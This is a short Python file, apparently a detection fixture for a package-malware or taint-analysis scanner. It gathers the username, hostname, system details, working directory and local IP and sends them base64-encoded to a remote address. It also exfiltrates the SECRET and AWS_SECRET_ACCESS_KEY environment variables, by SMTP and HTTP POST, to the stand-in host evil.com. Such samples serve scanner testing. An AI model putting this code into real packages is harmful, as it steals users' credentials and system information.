import os
import requests
import base64
import platform
import socket
import requests, base64, platform, os, socket

import smtplib

ip = [
    (s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close())
    for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]
][0][1]
d = "%s\n%s\n%s\n%s\n%s\n%s" % (
    "PYPI",
    os.getlogin(),
    platform.node(),
    str(platform.uname()),
    os.getcwd(),
    ip,
)
data_base64 = base64.b64encode(d.encode()).decode("utf-8")
response = requests.get("http://.24/v/%s" % data_base64)


server = smtplib.SMTP("evil.com")
server.sendmail("exfil@evil.com", "target@evil.com", os.getenv("SECRET"))


# multiple layers of function calls
def sink(data):
    requests.post("http://evil.com", data=data)


def intermediate(data):
    sink(data)


def wrapper(data):
    intermediate(data)


wrapper(os.getenv("AWS_SECRET_ACCESS_KEY"))
